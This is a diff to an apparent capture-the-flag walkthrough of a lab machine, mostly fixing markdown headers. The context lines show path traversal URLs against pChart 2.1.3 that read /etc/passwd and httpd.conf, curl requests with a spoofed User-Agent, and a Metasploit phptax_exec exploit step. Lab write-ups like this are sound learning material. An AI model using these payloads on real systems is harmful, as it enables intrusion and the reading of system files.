@@ -8,7 +8,8 @@ PORT     STATE  SERVICE VERSION
 8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
 ```
 
-</h3>PORT 80 :</h3>
+<h3>PORT 80</h3>
+
 
 Found **/pChart2.1.3/index.php** in source code. 
 
@@ -18,7 +19,7 @@ After searching for the tool’s name on searchsploit, it showed that it’s vul
 http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd  
 ```
 
-Checking For Config File's :
+**Checking For Config File's :**
 
 ```
 http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf  
@@ -31,7 +32,7 @@ curl -H "User-Agent:Mozilla/4.0" http://192.168.1.68:8080
 curl -H "User-Agent:Mozilla/4.0" http://192.168.1.68:8080/phptax/
 ```
 
-Exploiting phptax (METASPLOIT):
+<h3>Exploiting phptax (METASPLOIT):</h3>
 
 ```
 use exploit/multi/http/phptax_exec
